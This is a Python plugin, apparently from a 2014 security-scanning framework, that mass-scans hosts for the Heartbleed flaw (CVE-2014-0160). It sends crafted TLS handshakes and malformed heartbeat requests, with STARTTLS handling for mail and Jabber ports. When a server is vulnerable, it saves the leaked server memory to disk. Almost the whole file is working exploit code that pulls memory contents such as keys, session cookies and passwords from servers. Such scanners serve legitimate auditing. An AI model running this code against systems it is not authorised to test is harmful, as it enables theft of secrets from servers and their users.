#!/usr/bin/python

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of 
# conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list 
# of conditions and the following disclaimer in the documentation and/or other materials 
# provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used 
# to endorse or promote products derived from this software without specific prior written 
# permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF 
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE 
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR 
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
from __future__ import with_statement
import sys
import ccdClasses as ccd
import argparse
import random
import string
import socket
import select
import struct
import time
from datetime import datetime
import os
import __builtin__
from ctools import cTuples
from ctools import cUtil
import logging

__plgname__ = 'heartbleed'

# logging
LOG = "/tmp/" + __plgname__ + ".log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

BSIZE = 512

'''

    16 03 02 00 31 # TLS Header
    01 00 00 2d # Handshake header
    03 02 # ClientHello field: version number (TLS 1.1)
    50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 \
    33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96 # ClientHello field: random
    00 # ClientHello field: session id
    00 04 # ClientHello field: cipher suite length
    00 33 c0 11 # ClientHello field: cipher suite(s)
    01 # ClientHello field: compression support, length
    00 # ClientHello field: compression support, no compression (0)
    00 00 # ClientHello field: extension length (0)

'''

HANDSHAKE_RECORD_TYPE = "16"
HEARTBEAT_RECORD_TYPE = "18"

tls_versions = []  # '1.1'
TLS_VERSION = {
    '1.0': "0301",
    '1.1': "0302",
    '1.2': "0303"
}


def h2bin(x):
    return x.replace(' ', '').replace('\n', '')

hello2 = h2bin('''
              00  dc 01 00 00 d8 03 02 53
              43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
              bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
              00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
              00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
              c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
              c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
              c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
              c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
              00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
              03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
              00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
              00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
              00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
              00 0f 00 01 01
              ''')


# create the client hello pkt
def hello(tlsv):
    hp = HANDSHAKE_RECORD_TYPE
    hp += TLS_VERSION[tlsv]
    # this handshake states support for a wider set of ciphers, and therefore
    # is accepted by some more servers
    hp += hello2
    # this is an alternate client handshake, with less cipher suites
    #hp += "00310100002d0302500bafbbb75ab83ef0ab9ae3f39c6315334137acfd6c181a2460dc4967c2fd960000040033c01101000000"
    return hp.decode('hex')


def heartbeat(tlsv):
    hb = HEARTBEAT_RECORD_TYPE
    hb += TLS_VERSION[tlsv]
    hb += "0003014000"
    return hb.decode('hex')


def recvbytes_nonblock(s, length, timeout=15):

    """ recv length bytes from a nonblocking(!) socket s """

    endtime = time.time() + timeout
    rdata = ''
    remain = length
    # until all requested bytes are read
    while remain > 0:
        # or until the timer runs off
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        # TODO: maybe surround with try/catch
        r, w, e = select.select([s], [], [], timeout)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                # we know that there are still bytes to be read, otherwise the
                # loop condition would not have been met
                return None
            rdata += data
            # update number of remaining bytes
            remain -= len(data)
    return rdata


def recvmsg_nonblock(s):
    """ reciev a ssl handshake msg from the server """
    hdr = recvbytes_nonblock(s, 5)
    if hdr is None:
        logger.info('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvbytes_nonblock(s, ln)
    if pay is None:
        logger.info('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    return typ, ver, pay


def recvone_blocking(s):
    return s.recv(1024)


def recvall_blocking(s):
    data = ''
    while True:
        try:
            buf = s.recv(BSIZE)
            if not buf:
                break
            data += buf
        except:
            break
    return data


def do_handshake(s, v):
    s.send(hello(v))
    logger.info('Waiting for server hello')
    while True:
        typ, ver, pay = recvmsg_nonblock(s)
        if typ is None:
            logger.info('Server closed connection without sending Server Hello.')
            return False
        # Look for server hello done message.
        if len(pay) >= 4:
            logger.info(' ... received message: type = %d, ver = %04x, length = %d, pay = %02X' % (typ, ver, len(pay), ord(pay[-4])))
            # TODO:
            # not exactly sure what to expect here
            # rfc says typ==22 and 0x0e as the payload, but i had ssl
            # connections established after recieving pkgs with different
            # return types
            #if typ == 22 and ord(pay[-4]) == 0x0E:
            if ord(pay[-4]) == 0x0E:
                logger.info('ok')
                return True
        else:
            logger.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))


# callback to test if server is vulnerable
def hb_test(target):
    hostname = target[1]
    target = target[0]
    ip, port = target

    # set default return values, in case heartbleed does not succeed
    # where to store the leeched data
    fn = ''
    # leeched data
    data = []

    # in case of assumed vulnerability, remember what errors occurred, to estimate the credibility of the result
    errors = {}

    # success flag, set after data was successfully leeched from server
    vulnerable = {}

    # if any of the tlsvversions maybe is vulnerable, we set this to false
    not_vuln = True

    # iterate over all the specified tls versions
    for tlsv in tls_versions:

        logger.info('Testing target: %s, %s on tlsv %s', target, hostname, tlsv)
        vulnerable[tlsv] = False
        errors[tlsv] = []

        try:
            # based on the remote port we decide if its neccessary to go
            # through some sort of starttls phase in order to establish an ssl
            # connection
            if port in SNAME.keys():
                logger.info('trying starttls on %s:%d', target[0], target[1])
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect(target)
                callback = SNAME[port]
                success = callback(sock, target[0])
                if not success:
                    logger.warning('STARTTLS failed on %s:%d, trying ssl handshake anyway', target[0], target[1])
                    errors[tlsv].append('STARTTLS failed')
            else:
                logger.info('connecting to %s', target)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(target)
        except socket.error as e:
            logger.warning('Could not connect to %s:%d -> %s', target[0], target[1], e)
            if sock:
                sock.close()
            yield ('DOWN', target, hostname, fn, data, errors[tlsv])
            raise StopIteration

        # from here on we use non blocking communication, since i don't
        # know exactly how many pakets the server will send me and ...
        sock.setblocking(0)

        logger.info('attempting handshake on %s', target)
        # try to establish an ssl connection
        success = do_handshake(sock, tlsv)
        if not success:
            logger.warning('Handshake failed on %s:%d, continue anyway', target[0], target[1])
            errors[tlsv].append('HANDSHAKE failed')

        # By now we hopefully have recieved a server hello done and can proceed to
        # send the heartbeet msg to the server

        # Now send the heartbeet
        sock.send(heartbeat(tlsv))
        while True:
            typ, ver, pay = recvmsg_nonblock(sock)

            if typ is None:
                logger.info('No heartbeat response received, server likely not vulnerable')
                # DONE
                break

            if typ == 24:
                logger.info('Received heartbeat response from %s:%d', target[0], target[1])
                if len(pay) > 3:
                    logger.info('WARNING: server at %s:%d returned more data than it should - server is vulnerable!',
                                target[0], target[1])

                    # write leeched memory to disk for further inspection
                    fn = os.path.join(hb_test.OUTDIR, '%s_%d_%s' %
                                      (target[0], target[1], time.strftime("%Y-%m-%d_%H:%M:%S")))
                    with open(fn, 'w+b') as fd:
                        fd.write(pay)

                    # mark
                    vulnerable[tlsv] = tlsv
                    data = pay
                else:
                    logger.info('Server %s:%d processed malformed heartbeat, but did not return any extra data.',
                                target[0], target[1])
                # DONE
                break

            if typ == 21:
                logger.info('Received alert from %s:%d', target[0], target[1])
                # DONE
                break

        # if the tested tls version is found to be vulnerable and no errors
        # occurred, we are done
        # if there were errors, but it still has been found vunlerable,
        # we yield the result along with the errors, but continue with the
        # other tls versions
        if vulnerable[tlsv]:
            not_vuln = False
            yield (vulnerable[tlsv], target, hostname, fn, data, errors[tlsv])
            if not errors[tlsv]:
                break

    if not_vuln:
        yield ('NOT_VULN', target, hostname, fn, data, errors[tlsv])
    raise StopIteration


def tls_smtp(s, x=0):
    logger.info('Testing SMTP STARTTLS')
    recvone_blocking(s)
    #recv_timeout(s, 10)
    #s.recv(BSIZE)
    #recvbytes_nonblock(s, 10)
    s.send("EHLO " + ''.join([random.choice(string.ascii_letters) for _ in range(10)]) + "\n")
    data = recvone_blocking(s)
    #data = recv_timeout(s, 10)
    #data = s.recv(BSIZE)
    if not data or 'STARTTLS' not in data:
        return None
    s.send('STARTTLS\n')
    data = recvone_blocking(s)
    #data = s.recv(BSIZE)
    #data = recv_timeout(s, 10)
    if data:
        return data
    return None


def tls_imap(s, x=0):
    logger.info('Testing IMAP STARTTLS')
    recvone_blocking(s)
    #recv_timeout(s, 10)
    #s.recv(BSIZE)
    s.send("a001 CAPABILITY\r\n")
    data = recvone_blocking(s)
    #data = s.recv(BSIZE)
    #data = recv_timeout(s, 10)
    if not data or 'STARTTLS' not in data:
        return None
    s.send('a002 STARTTLS\r\n')
    data = recvone_blocking(s)
    #data = recv_timeout(s, 10)
    #data = s.recv(BSIZE)
    if data:
        return data
    return None


def tls_pop3(s, x=0):
    logger.info('Testing POP3 STARTTLS')
    recvone_blocking(s)
    #recv_timeout(s, 10)
    #s.recv(BSIZE)
    s.send("CAPA\r\n")
    data = recvone_blocking(s)
    #data = s.recv(BSIZE)
    #data = recv_timeout(s, 10)
    if not data or '^-' in data:
        return None
    s.send('STLS\r\n')
    data = recvone_blocking(s)
    #data = recv_timeout(s, 10)
    #data = s.recv(BSIZE)
    if data:
        return data
    return None


def tls_jabber(s, target):
    logger.info('Testing JABBER STARTTLS')
    msg = "<?xml version='1.0' ?>"
    msg += "<stream:stream xmlns='jabber:client' "
    msg += "xmlns:stream='http://etherx.jabber.org/streams' "
    msg += "xmlns:tls='http://www.ietf.org/rfc/rfc2595.txt' "
    msg += "to=%s'>" % target

    s.send(msg)
    data = recvone_blocking(s)
    #data = recv_timeout(s, 10)
    #data = s.recv(BSIZE)
    if not data or 'stream:error' in data or 'starttls' not in data or 'STARTTLS' not in data:
        return None
    msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
    s.send(msg)
    data = recvone_blocking(s)
    #data = recv_timeout(s, 10)
    #data = s.recv(BSIZE)
    if data:
        return data
    return None


TTLS_CALLBACKS = {
    'SMTP': tls_smtp,
    'IMAP': tls_imap,
    'JABBER': tls_jabber,
    'POP3': tls_pop3,
}

SNAME = {
    25: tls_smtp,
    #465: 'SMTP',
    143: tls_imap,
    #993: 'IMAP',
    5222: tls_jabber,
    #5223: 'JABBER',
    110: tls_pop3,
    #995: 'POP3',
}


def recv_timeout(sock, timeout=2):
    #make socket non blocking
    sock.setblocking(0)

    #total data partwise in an array
    total_data = []
    data = ''

    #beginning time
    begin = time.time()
    while 1:
        if total_data and time.time() - begin > timeout:
            break

        elif time.time() - begin > timeout * 2:
            break

        try:
            data = sock.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin = time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass

    return ''.join(total_data)


hb_test.OUTDIR = 'outdir'
hb_test.TIMEOUT = 5


def grep_ascii(data, mlen=80):
    words = []
    word = ''
    h = ''
    for c in data:
        if 32 <= ord(c) <= 126:
            word += c
        else:
            h += '%02X ' % ord(c)
            if word != ' ':
                words.append(word)
            word = ''
    #ascii = ' '.join(words)
    #if len(ascii) < 10:
    ascii = h
    if len(ascii) > mlen:
        ascii = ascii[29:mlen]
    return ascii + '...'


class Heartbleed(object):

    def __init__(self, args, dbh=None):
        opt = parse(args)
        global tls_versions
        tls_versions = opt.tlsv

        hb_test.OUTDIR = opt.outdir
        hb_test.TIMEOUT = opt.to
        try:
            hb_test.OUTDIR = os.path.join(__builtin__.openhome.base_dir, hb_test.OUTDIR)
        except:
            pass
        if not os.path.exists(hb_test.OUTDIR):
            os.makedirs(hb_test.OUTDIR)
        else:
            logger.info('%s directory already exists' % hb_test.OUTDIR)
            # check access permissions
            if not os.access(hb_test.OUTDIR, os.R_OK):
                print 'Error %s not readable' % hb_test.OUTDIR
                sys.exit(1)
            if not os.access(hb_test.OUTDIR, os.W_OK):
                print 'Error %s not writable' % hb_test.OUTDIR
                sys.exit(1)
            if not os.access(hb_test.OUTDIR, os.X_OK):
                print 'Error %s not executable' % hb_test.OUTDIR
                sys.exit(1)

        start = datetime.now()
        ig_targets = cTuples.cInputGenerator(data=opt.target,
                                             filename=opt.target_fn,
                                             circle=False,
                                             expand_cb=lambda t: cUtil.mkIP2(t,
                                                                             ports=opt.ports,
                                                                             noSplit=True,
                                                                             noResolve=False),
                                             maxthreads=opt.nthreads
                                             )
        ig_targets.start()

        tuples = cTuples.cTuples(inputs=[ig_targets],
                                 prep_callback=hb_test,
                                 maxthreads=opt.nthreads,
                                 delay=opt.delay)
        tuples.start()

        n = 0
        n_vuln = 0
        n_notvuln = 0
        n_down = 0

        timestamp = time.strftime("%Y-%m-%d_%H:%M:%S")
        fd_vuln = open(os.path.join(hb_test.OUTDIR, 'vulnerable_%s' % timestamp), 'w')
        fd_notvuln = open(os.path.join(hb_test.OUTDIR, 'not_vulnerable_%s' % timestamp), 'w')
        fd_down = open(os.path.join(hb_test.OUTDIR, 'down_%s' % timestamp), 'w')

        fmt = '{:60}{:<20}'
        print
        print 'Started scan for CVE-2014-0160'
        print 'Testing ports: %s' % ', '.join(map(str, opt.ports))
        print 'Testing tls versions: %s' % ', '.join(map(str, opt.tlsv))
        print
        print '-' * 80
        print
        for vulnerable, target, hostname, fn, sample, errors in tuples.tuple_q:
            n += 1
            if vulnerable in opt.tlsv:
                if dbh:
                    br = ccd.HeartbleedResult(
                        ip=target[0],
                        fqdn=hostname,
                        port=target[1],
                        sample=grep_ascii(sample),
                        risk=9,
                        tlsv=vulnerable,
                    )
                    dbh.add(br)

                if not hostname:
                    hostname = target[0]

                n_vuln += 1
                fd_vuln.write('%s:%d\n' % (hostname, target[1]))
                if errors:
                    fd_vuln.write('Warning: errors occured -> %s\n' % ', '.join(errors))
                fd_vuln.flush()

                if errors:
                    print fmt.format('\033[93m%s:%d\033[0m' % (hostname, target[1]),
                                     'is vulnerable, tlsv %s' % vulnerable)
                    print '\tError(s): %s' % ', '.join(errors)
                else:
                    print fmt.format('\033[91m%s:%d\033[0m' % (hostname, target[1]),
                                     'is vulnerable, tlsv %s' % vulnerable)
                print '\t%d bytes stored in %s' % (len(sample), fn)
            elif vulnerable == 'NOT_VULN':
                if dbh:
                    br = ccd.HeartbleedResult_NV(
                        ip=target[0],
                        fqdn=hostname,
                        port=target[1],
                        risk=0,
                        tlsv='-'
                    )
                    dbh.add(br)

                if not hostname:
                    hostname = target[0]
                n_notvuln += 1
                fd_notvuln.write('%s:%d\n' % (hostname, target[1]))
                if errors:
                    fd_notvuln.write('\nWarning: errors occured -> %s' % ', '.join(errors))
                fd_notvuln.flush()

                if errors:
                    print fmt.format('\033[93m%s:%d\033[0m' % (hostname, target[1]),
                                     'is not vulnerable')
                    print '\tError(s): %s' % ', '.join(errors)
                else:
                    print fmt.format('\033[92m%s:%d\033[0m' % (hostname, target[1]),
                                     'is not vulnerable')
            elif vulnerable == 'DOWN':
                n_down += 1
                fd_down.write('%s:%d\n' % (hostname, target[1]))
                fd_down.flush()

        tuples.join()

        print
        print '-' * 80
        print
        print 'Finished scan in %f seconds' % cUtil.secs(start)
        print
        print '%d targets tested' % n
        print '%d targets found vulnerable (see %s)' % (n_vuln, fd_vuln.name)
        print '%d targets found not vulnerable (see %s)' % (n_notvuln, fd_notvuln.name)
        print '%d targets were down (see %s)' % (n_down, fd_down.name)

        fd_vuln.close()
        fd_notvuln.close()
        fd_down.close()


def parse(args):
    parser = argparse.ArgumentParser()
    parser.add_argument('-T',
                        help='file containing urls or ips',
                        dest='target_fn'
                        )
    parser.add_argument('-t',
                        help='url or ip',
                        nargs='+',
                        dest='target',
                        default=[]
                        )
    parser.add_argument('-ports',
                        help='list of ports to scan (default: 443 25 465 143 993 5222 5223 110 995)',
                        dest='ports',
                        nargs='+',
                        default=[443, 25, 465, 143, 993, 5222, 5223, 110, 995, 5061],
                        type=int
                        )
    parser.add_argument('-delay',
                        help='delay in between requests',
                        dest='delay',
                        default=0.0,
                        type=float
                        )
    parser.add_argument('-tlsv',
                        help='tls version 1.0/1.1/1.2 (default [1.1, 1.2, 1.0])',
                        nargs='+',
                        default=['1.1', '1.2', '1.0'],
                        )
    parser.add_argument('-o',
                        help='directory to store recieved memdumps',
                        default=hb_test.OUTDIR,
                        dest='outdir'
                        )
    parser.add_argument('-to',
                        help='server timeout (default %d seconds)' % hb_test.TIMEOUT,
                        default=hb_test.TIMEOUT,
                        )
    parser.add_argument('-nt',
                        help='Maximum number of threads to scan with, each host gets a new thread (default 64)',
                        dest='nthreads',
                        default=64,
                        type=int
                        )

    if not args:
        parser.print_help()
        sys.exit(0)

    opt = parser.parse_args(args)
    return opt


if __name__ == '__main__':
    hb = Heartbleed(sys.argv[1:])
